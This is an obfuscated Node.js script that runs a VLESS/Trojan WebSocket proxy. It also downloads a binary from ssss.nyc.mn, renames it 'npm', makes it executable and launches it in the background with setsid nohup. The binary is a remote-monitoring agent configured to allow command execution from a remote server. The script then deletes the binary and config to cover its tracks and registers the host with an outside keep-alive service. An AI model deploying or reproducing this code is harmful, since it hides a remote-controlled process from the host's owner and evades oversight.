const _0x7c4e65=_0x4782;(function(_0x15799d,_0x1c2c65){const _0x30c74b=_0x4782,_0x56db3c=_0x15799d();while(!![]){try{const _0x6c8173=parseInt(_0x30c74b(0x151))/0x1+-parseInt(_0x30c74b(0x1ab))/0x2*(parseInt(_0x30c74b(0x180))/0x3)+-parseInt(_0x30c74b(0x17d))/0x4*(-parseInt(_0x30c74b(0x18d))/0x5)+parseInt(_0x30c74b(0x14f))/0x6+parseInt(_0x30c74b(0x134))/0x7*(parseInt(_0x30c74b(0x199))/0x8)+parseInt(_0x30c74b(0x194))/0x9+-parseInt(_0x30c74b(0x1a9))/0xa;if(_0x6c8173===_0x1c2c65)break;else _0x56db3c['push'](_0x56db3c['shift']());}catch(_0x5160a2){_0x56db3c['push'](_0x56db3c['shift']());}}}(_0x1cbe,0xaeffe));function _0x4782(_0x5d238f,_0x7d2cdd){_0x5d238f=_0x5d238f-0x130;const _0x1cbe42=_0x1cbe();let _0x4782cd=_0x1cbe42[_0x5d238f];return _0x4782cd;}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x7c4e65(0x15e)),net=require('net'),path=require(_0x7c4e65(0x17f)),crypto=require('crypto'),{Buffer}=require(_0x7c4e65(0x1a1)),{exec,execSync}=require(_0x7c4e65(0x169)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x7c4e65(0x17c)][_0x7c4e65(0x154)]||_0x7c4e65(0x15c),NEZHA_SERVER=process['env'][_0x7c4e65(0x13c)]||'',NEZHA_PORT=process['env'][_0x7c4e65(0x1a2)]||'',NEZHA_KEY=process[_0x7c4e65(0x17c)][_0x7c4e65(0x15a)]||'',DOMAIN=process[_0x7c4e65(0x17c)][_0x7c4e65(0x1ae)]||_0x7c4e65(0x132),AUTO_ACCESS=process[_0x7c4e65(0x17c)][_0x7c4e65(0x131)]||!![],WSPATH=process['env'][_0x7c4e65(0x158)]||UUID[_0x7c4e65(0x173)](0x0,0x8),SUB_PATH=process[_0x7c4e65(0x17c)][_0x7c4e65(0x195)]||_0x7c4e65(0x19a),NAME=process[_0x7c4e65(0x17c)][_0x7c4e65(0x174)]||'',PORT=process[_0x7c4e65(0x17c)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x58f405=_0x7c4e65;try{const _0xc6ef5=await axios[_0x58f405(0x16a)]('https://api.ip.sb/geoip'),_0x182a18=_0xc6ef5[_0x58f405(0x157)];ISP=(_0x182a18[_0x58f405(0x13b)]+'-'+_0x182a18[_0x58f405(0x14d)])[_0x58f405(0x16c)](/ /g,'_');}catch(_0x5de471){ISP=_0x58f405(0x13e);}};GetISP();const httpServer=http[_0x7c4e65(0x147)]((_0x2ee1d6,_0x62f44f)=>{const _0x3efc49=_0x7c4e65;if(_0x2ee1d6[_0x3efc49(0x167)]==='/'){const _0x5529a7=path[_0x3efc49(0x162)](__dirname,_0x3efc49(0x184));fs[_0x3efc49(0x18f)](_0x5529a7,_0x3efc49(0x19f),(_0x3cdcb6,_0x55c7ab)=>{const _0x57d6b7=_0x3efc49;if(_0x3cdcb6){_0x62f44f['writeHead'](0xc8,{'Content-Type':_0x57d6b7(0x161)}),_0x62f44f[_0x57d6b7(0x141)](_0x57d6b7(0x139));return;}_0x62f44f[_0x57d6b7(0x16b)](0xc8,{'Content-Type':_0x57d6b7(0x161)}),_0x62f44f['end'](_0x55c7ab);});return;}else{if(_0x2ee1d6[_0x3efc49(0x167)]==='/'+SUB_PATH){const _0x4342ef=NAME?NAME+'-'+ISP:ISP,_0x48631f=_0x3efc49(0x176)+UUID+'@'+DOMAIN+_0x3efc49(0x193)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x3efc49(0x138)+WSPATH+'#'+_0x4342ef,_0x444e1c=_0x3efc49(0x135)+UUID+'@'+DOMAIN+_0x3efc49(0x165)+DOMAIN+_0x3efc49(0x146)+DOMAIN+_0x3efc49(0x138)+WSPATH+'#'+_0x4342ef,_0x16f546=_0x48631f+'\x0a'+_0x444e1c,_0x311ede=Buffer[_0x3efc49(0x149)](_0x16f546)[_0x3efc49(0x163)](_0x3efc49(0x17e));_0x62f44f[_0x3efc49(0x16b)](0xc8,{'Content-Type':_0x3efc49(0x1a0)}),_0x62f44f[_0x3efc49(0x141)](_0x311ede+'\x0a');}else _0x62f44f['writeHead'](0x194,{'Content-Type':_0x3efc49(0x1a0)}),_0x62f44f['end'](_0x3efc49(0x182));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x7c4e65(0x16c)](/-/g,''),DNS_SERVERS=[_0x7c4e65(0x1a3),'1.1.1.1'];function resolveHost(_0xb5ff85){return new Promise((_0x1f0c45,_0x2507df)=>{const _0x5d5c1d=_0x4782;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5d5c1d(0x14c)](_0xb5ff85)){_0x1f0c45(_0xb5ff85);return;}let _0x191627=0x0;function _0x5ea151(){const _0xaba9b0=_0x5d5c1d;if(_0x191627>=DNS_SERVERS['length']){_0x2507df(new Error(_0xaba9b0(0x145)+_0xb5ff85+_0xaba9b0(0x19c)));return;}const _0x706626=DNS_SERVERS[_0x191627];_0x191627++;const _0x3a5f04=_0xaba9b0(0x18b)+encodeURIComponent(_0xb5ff85)+_0xaba9b0(0x15d);axios[_0xaba9b0(0x16a)](_0x3a5f04,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x4a36f0=>{const _0x16a151=_0xaba9b0,_0xbc3325=_0x4a36f0[_0x16a151(0x157)];if(_0xbc3325['Status']===0x0&&_0xbc3325['Answer']&&_0xbc3325[_0x16a151(0x177)][_0x16a151(0x14b)]>0x0){const _0x2a4b66=_0xbc3325[_0x16a151(0x177)]['find'](_0x30d87c=>_0x30d87c[_0x16a151(0x190)]===0x1);if(_0x2a4b66){_0x1f0c45(_0x2a4b66[_0x16a151(0x157)]);return;}}_0x5ea151();})['catch'](_0x40f406=>{_0x5ea151();});}_0x5ea151();});}function handleVlessConnection(_0xdae20d,_0x198fcd){const _0x33e941=_0x7c4e65,[_0x4350d0]=_0x198fcd,_0x1f1b01=_0x198fcd[_0x33e941(0x173)](0x1,0x11);if(!_0x1f1b01['every']((_0x182b45,_0x559e7b)=>_0x182b45==parseInt(uuid[_0x33e941(0x140)](_0x559e7b*0x2,0x2),0x10)))return![];let _0x13cd8f=_0x198fcd['slice'](0x11,0x12)[_0x33e941(0x15f)]()+0x13;const _0x1ea0e4=_0x198fcd[_0x33e941(0x173)](_0x13cd8f,_0x13cd8f+=0x2)[_0x33e941(0x196)](0x0),_0xeecd7d=_0x198fcd[_0x33e941(0x173)](_0x13cd8f,_0x13cd8f+=0x1)[_0x33e941(0x15f)](),_0x16a0b1=_0xeecd7d==0x1?_0x198fcd['slice'](_0x13cd8f,_0x13cd8f+=0x4)[_0x33e941(0x162)]('.'):_0xeecd7d==0x2?new TextDecoder()['decode'](_0x198fcd['slice'](_0x13cd8f+0x1,_0x13cd8f+=0x1+_0x198fcd[_0x33e941(0x173)](_0x13cd8f,_0x13cd8f+0x1)['readUInt8']())):_0xeecd7d==0x3?_0x198fcd['slice'](_0x13cd8f,_0x13cd8f+=0x10)[_0x33e941(0x1ad)]((_0x26dec2,_0x69091b,_0x3ada4e,_0x400a9f)=>_0x3ada4e%0x2?_0x26dec2[_0x33e941(0x14e)](_0x400a9f['slice'](_0x3ada4e-0x1,_0x3ada4e+0x1)):_0x26dec2,[])['map'](_0x3b2f02=>_0x3b2f02[_0x33e941(0x196)](0x0)[_0x33e941(0x163)](0x10))[_0x33e941(0x162)](':'):'';_0xdae20d[_0x33e941(0x1a8)](new Uint8Array([_0x4350d0,0x0]));const _0x292368=createWebSocketStream(_0xdae20d);return resolveHost(_0x16a0b1)[_0x33e941(0x142)](_0x59d6dc=>{const _0x5b094a=_0x33e941;net[_0x5b094a(0x19e)]({'host':_0x59d6dc,'port':_0x1ea0e4},function(){const _0x498558=_0x5b094a;this[_0x498558(0x166)](_0x198fcd[_0x498558(0x173)](_0x13cd8f)),_0x292368['on'](_0x498558(0x130),()=>{})[_0x498558(0x14a)](this)['on'](_0x498558(0x130),()=>{})[_0x498558(0x14a)](_0x292368);})['on'](_0x5b094a(0x130),()=>{});})[_0x33e941(0x159)](_0x34ee5f=>{const _0x254fe8=_0x33e941;net[_0x254fe8(0x19e)]({'host':_0x16a0b1,'port':_0x1ea0e4},function(){const _0x926764=_0x254fe8;this[_0x926764(0x166)](_0x198fcd[_0x926764(0x173)](_0x13cd8f)),_0x292368['on'](_0x926764(0x130),()=>{})[_0x926764(0x14a)](this)['on'](_0x926764(0x130),()=>{})['pipe'](_0x292368);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x4c2b91,_0x29c20d){const _0x2f70c3=_0x7c4e65;try{if(_0x29c20d[_0x2f70c3(0x14b)]<0x3a)return![];const _0x4346f1=_0x29c20d[_0x2f70c3(0x173)](0x0,0x38)[_0x2f70c3(0x163)](),_0x40e489=[UUID];let _0x2b0057=null;for(const _0x1972a5 of _0x40e489){const _0x5cc2d5=crypto[_0x2f70c3(0x16f)](_0x2f70c3(0x187))['update'](_0x1972a5)[_0x2f70c3(0x156)](_0x2f70c3(0x19b));if(_0x5cc2d5===_0x4346f1){_0x2b0057=_0x1972a5;break;}}if(!_0x2b0057)return![];let _0x3d481e=0x38;_0x29c20d[_0x3d481e]===0xd&&_0x29c20d[_0x3d481e+0x1]===0xa&&(_0x3d481e+=0x2);const _0x252078=_0x29c20d[_0x3d481e];if(_0x252078!==0x1)return![];_0x3d481e+=0x1;const _0x15f39b=_0x29c20d[_0x3d481e];_0x3d481e+=0x1;let _0x3dfdd9,_0x428ebc;if(_0x15f39b===0x1)_0x3dfdd9=_0x29c20d[_0x2f70c3(0x173)](_0x3d481e,_0x3d481e+0x4)[_0x2f70c3(0x162)]('.'),_0x3d481e+=0x4;else{if(_0x15f39b===0x3){const _0x2e719f=_0x29c20d[_0x3d481e];_0x3d481e+=0x1,_0x3dfdd9=_0x29c20d[_0x2f70c3(0x173)](_0x3d481e,_0x3d481e+_0x2e719f)[_0x2f70c3(0x163)](),_0x3d481e+=_0x2e719f;}else{if(_0x15f39b===0x4)_0x3dfdd9=_0x29c20d[_0x2f70c3(0x173)](_0x3d481e,_0x3d481e+0x10)[_0x2f70c3(0x1ad)]((_0x3cfffd,_0x3d83a1,_0x107df5,_0x3960a1)=>_0x107df5%0x2?_0x3cfffd['concat'](_0x3960a1[_0x2f70c3(0x173)](_0x107df5-0x1,_0x107df5+0x1)):_0x3cfffd,[])[_0x2f70c3(0x178)](_0x3fc545=>_0x3fc545['readUInt16BE'](0x0)[_0x2f70c3(0x163)](0x10))[_0x2f70c3(0x162)](':'),_0x3d481e+=0x10;else return![];}}_0x428ebc=_0x29c20d['readUInt16BE'](_0x3d481e),_0x3d481e+=0x2;_0x3d481e<_0x29c20d[_0x2f70c3(0x14b)]&&_0x29c20d[_0x3d481e]===0xd&&_0x29c20d[_0x3d481e+0x1]===0xa&&(_0x3d481e+=0x2);const _0x5b1651=createWebSocketStream(_0x4c2b91);return resolveHost(_0x3dfdd9)[_0x2f70c3(0x142)](_0x5cb505=>{const _0x66d148=_0x2f70c3;net['connect']({'host':_0x5cb505,'port':_0x428ebc},function(){const _0x2fe4b5=_0x4782;_0x3d481e<_0x29c20d[_0x2fe4b5(0x14b)]&&this[_0x2fe4b5(0x166)](_0x29c20d[_0x2fe4b5(0x173)](_0x3d481e)),_0x5b1651['on'](_0x2fe4b5(0x130),()=>{})['pipe'](this)['on'](_0x2fe4b5(0x130),()=>{})[_0x2fe4b5(0x14a)](_0x5b1651);})['on'](_0x66d148(0x130),()=>{});})[_0x2f70c3(0x159)](_0x4d689e=>{const _0x2925cf=_0x2f70c3;net['connect']({'host':_0x3dfdd9,'port':_0x428ebc},function(){const _0x451be4=_0x4782;_0x3d481e<_0x29c20d[_0x451be4(0x14b)]&&this['write'](_0x29c20d[_0x451be4(0x173)](_0x3d481e)),_0x5b1651['on']('error',()=>{})[_0x451be4(0x14a)](this)['on'](_0x451be4(0x130),()=>{})['pipe'](_0x5b1651);})['on'](_0x2925cf(0x130),()=>{});}),!![];}catch(_0x483afa){return![];}}wss['on'](_0x7c4e65(0x185),(_0x503c07,_0x409405)=>{const _0x18e633=_0x7c4e65,_0x54210a=_0x409405[_0x18e633(0x167)]||'';_0x503c07[_0x18e633(0x164)](_0x18e633(0x160),_0x5bc456=>{const _0x193ccc=_0x18e633;if(_0x5bc456['length']>0x11&&_0x5bc456[0x0]===0x0){const _0x13378c=_0x5bc456[_0x193ccc(0x173)](0x1,0x11),_0x462b8d=_0x13378c[_0x193ccc(0x17a)]((_0x7ebf4b,_0x5b3ca0)=>_0x7ebf4b==parseInt(uuid['substr'](_0x5b3ca0*0x2,0x2),0x10));if(_0x462b8d){!handleVlessConnection(_0x503c07,_0x5bc456)&&_0x503c07['close']();return;}}!handleTrojanConnection(_0x503c07,_0x5bc456)&&_0x503c07[_0x193ccc(0x198)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x494c02=_0x7c4e65,_0x41d54c=os['arch']();return _0x41d54c==='arm'||_0x41d54c===_0x494c02(0x170)||_0x41d54c===_0x494c02(0x18a)?!NEZHA_PORT?_0x494c02(0x155):_0x494c02(0x183):!NEZHA_PORT?_0x494c02(0x18e):_0x494c02(0x191);},downloadFile=async()=>{const _0x3654e7=_0x7c4e65;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2da634=getDownloadUrl(),_0x7741e7=await axios({'method':'get','url':_0x2da634,'responseType':_0x3654e7(0x152)}),_0x10e712=fs['createWriteStream'](_0x3654e7(0x171));return _0x7741e7[_0x3654e7(0x157)][_0x3654e7(0x14a)](_0x10e712),new Promise((_0x160322,_0xe95967)=>{const _0x29cd5a=_0x3654e7;_0x10e712['on'](_0x29cd5a(0x179),()=>{const _0xa057f2=_0x29cd5a;console[_0xa057f2(0x136)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x15e179=>{if(_0x15e179)_0xe95967(_0x15e179);_0x160322();});}),_0x10e712['on'](_0x29cd5a(0x130),_0xe95967);});}catch(_0x1a11a2){throw _0x1a11a2;}},runnz=async()=>{const _0x2c1181=_0x7c4e65;try{const _0x3a3b5f=execSync(_0x2c1181(0x1a7),{'encoding':_0x2c1181(0x189)});if(_0x3a3b5f[_0x2c1181(0x143)]()!==''){console[_0x2c1181(0x136)](_0x2c1181(0x18c));return;}}catch(_0x5a042d){}await downloadFile();let _0x31937e='',_0x45e64e=[_0x2c1181(0x181),_0x2c1181(0x137),_0x2c1181(0x168),_0x2c1181(0x13f),_0x2c1181(0x1a6),_0x2c1181(0x186)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x113818=_0x45e64e['includes'](NEZHA_PORT)?_0x2c1181(0x148):'';_0x31937e=_0x2c1181(0x1ac)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x113818+_0x2c1181(0x17b);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x211769=NEZHA_SERVER[_0x2c1181(0x16e)](':')?NEZHA_SERVER[_0x2c1181(0x144)](':')['pop']():'',_0x3ab517=_0x45e64e['includes'](_0x211769)?_0x2c1181(0x16d):_0x2c1181(0x172),_0x3dfbea='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2c1181(0x13d)+_0x3ab517+_0x2c1181(0x153)+UUID;fs[_0x2c1181(0x1aa)]('config.yaml',_0x3dfbea);}_0x31937e=_0x2c1181(0x133);}else{console['log'](_0x2c1181(0x1a4));return;}}try{exec(_0x31937e,{'shell':_0x2c1181(0x197)},_0x1a67d3=>{const _0x4e06a1=_0x2c1181;if(_0x1a67d3)console[_0x4e06a1(0x130)](_0x4e06a1(0x188),_0x1a67d3);else console[_0x4e06a1(0x136)](_0x4e06a1(0x15b));});}catch(_0x2f991e){console[_0x2c1181(0x130)](_0x2c1181(0x150)+_0x2f991e);}};async function addAccessTask(){const _0x33f354=_0x7c4e65;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2b1972='https://'+DOMAIN;try{const _0x52b9d8=await axios[_0x33f354(0x1a5)](_0x33f354(0x192),{'url':_0x2b1972},{'headers':{'Content-Type':'application/json'}});console[_0x33f354(0x136)](_0x33f354(0x13a));}catch(_0xa17e05){}}const delFiles=()=>{const _0x3a02c5=_0x7c4e65;fs[_0x3a02c5(0x175)]('npm',()=>{}),fs[_0x3a02c5(0x175)]('config.yaml',()=>{});};function _0x1cbe(){const _0x3c0d74=['Unknown','2087','substr','end','then','trim','split','Failed\x20to\x20resolve\x20','&fp=chrome&type=ws&host=','createServer','--tls','from','pipe','length','test','isp','concat','4219446rzAOVH','error:\x20','779463LGinDm','stream','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','https://arm64.ssss.nyc.mn/v1','digest','data','WSPATH','catch','NEZHA_KEY','npm\x20is\x20running','305d3e6f-4660-4916-bc31-1cf46c29f3da','&type=A','axios','readUInt8','message','text/html','join','toString','once',':443?security=tls&sni=','write','url','2096','child_process','get','writeHead','replace','true','includes','createHash','arm64','npm','false','slice','NAME','unlink','vless://','Answer','map','finish','every','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','env','4CaaLXz','base64','path','514095CYcxab','443','Not\x20Found\x0a','https://arm64.ssss.nyc.mn/agent','index.html','connection','2053','sha224','npm\x20running\x20error:','utf-8','aarch64','https://dns.google/resolve?name=','npm\x20is\x20already\x20running,\x20skip\x20running...','355345wazFTz','https://amd64.ssss.nyc.mn/v1','readFile','type','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url',':443?encryption=none&security=tls&sni=','4519953rGfXFC','SUB_PATH','readUInt16BE','/bin/bash','close','8ckgmaM','sub','hex','\x20with\x20all\x20DNS\x20servers','listen','connect','utf8','text/plain','buffer','NEZHA_PORT','8.8.4.4','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','post','2083','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','19577430yWIqxQ','writeFileSync','8ggezQY','setsid\x20nohup\x20./npm\x20-s\x20','reduce','DOMAIN','error','AUTO_ACCESS','1234.abc.com','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','9128077xHLtbx','trojan://','log','8443','&path=%2F','Hello\x20world!','Automatic\x20Access\x20Task\x20added\x20successfully','country_code','NEZHA_SERVER','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'];_0x1cbe=function(){return _0x3c0d74;};return _0x1cbe();}httpServer[_0x7c4e65(0x19d)](PORT,()=>{const _0x2f49d4=_0x7c4e65;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2f49d4(0x136)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
